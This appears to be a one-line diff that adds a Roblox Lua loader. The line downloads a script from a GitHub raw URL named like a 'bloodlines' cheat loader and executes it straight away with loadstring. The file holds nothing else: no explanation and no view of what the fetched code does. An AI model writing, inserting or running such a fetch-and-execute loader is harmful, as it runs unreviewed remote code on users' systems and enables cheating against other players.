@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/bloodlines-spam6-vv0xw8mkkw9gey.lua"))()
